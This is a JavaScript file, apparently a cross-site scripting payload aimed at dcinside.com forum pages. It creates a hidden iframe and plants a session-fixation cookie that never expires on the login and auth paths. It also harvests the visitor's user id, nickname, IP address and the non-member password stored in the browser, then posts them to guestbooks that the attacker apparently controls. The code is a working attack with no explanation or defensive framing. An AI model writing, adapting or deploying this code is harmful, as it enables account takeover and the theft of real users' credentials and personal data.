document.domain = 'dcinside.com';
parent.document.querySelector("embed").remove();
nas = document.createElement('iframe');
nas.id = 'hash';
nas.name = 'hash';
nas.scrolling = 'no';
nas.style.position = 'fixed';
nas.style.top = '1px';
nas.style.left = '1px';
nas.style.width = '1px';
nas.style.height = '1px';
nas.style.visibility = 'hidden';
document.getElementsByTagName('br')[0].appendChild(nas);
const genRanHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');

function format() {
    var args = Array.prototype.slice.call(arguments, 1);
    return arguments[0].replace(/\{(\d+)\}/g, function(match, index) {
        return args[index];
    });
}

function fix() {
    sessid = genRanHex(32);
    document.cookie = format("PHPSESSID= {0}; domain=.dcinside.com; path=/login; SamSite=None; expires=Fri, 31 Dec 9999 23:59:59 GMT; Secure;", sessid);
    document.cookie = format("PHPSESSID= {0}; domain=.dcinside.com; path=/auth; SamSite=None; expires=Fri, 31 Dec 9999 23:59:59 GMT; Secure;", sessid);
    return sessid
}

function tor() {
    var a = parent.localStorage.getItem('nonmember_nick')
    var b = parent.document.getElementsByName('user_ip')[0].value;
    var c = parent.localStorage.getItem('nonmember_pw');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://gallog.dcinside.com/kjm0770/ajax/guestbook_ajax/write', true)
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.onload = function () {
        console.log(this.responseText);
    };
    data='ci_t=&password=1234&is_secret=0&name=ㅇㅇ&memo='+a + '(' + b + ')' + '\n' + c;
    if (c) {
        xhr.send(data);
    }
}

var writer_id = String(parent.document.querySelector('#container > section > article:nth-child(3) > div.view_content_wrap > header > div > div > div.fl > a > img').onclick).slice(61, -5);
try {
    var user_id = String(parent.document.querySelector("#user_data_lyr > ul > li:nth-child(1) > a").href).split('/', 4)[3];
    var user_nick = parent.document.getElementsByName('name')[0].value;
    var nick = parent.localStorage.getItem('nonmember_nick');
    var pw = parent.localStorage.getItem('nonmember_pw');
    var user_ip = parent.document.getElementsByName('user_ip')[0].value;
    if (writer_id != user_id) {
        var sess = fix();
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://gallog.dcinside.com/lastskyline/ajax/guestbook_ajax/write', true)
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.onload = function () {
            // do something to response
            console.log(this.responseText);
        };
        data='ci_t=&password=1234&is_secret=0&name='+user_nick+'&memo='+user_nick + '(' + user_id + ')' + '\n' + sess + '\n' + user_ip + '\n' + nick + '(' + pw + ')';
        xhr.send(data);
        //window.open('https://sign.dcinside.com/logout?s_url=https%3A%2F%2Fsign.dcinside.com%2Flogin', 'hash', 'width=1px, height=1px');
    } else {}
} catch (error) {
    //console.log(error);
    tor();
}
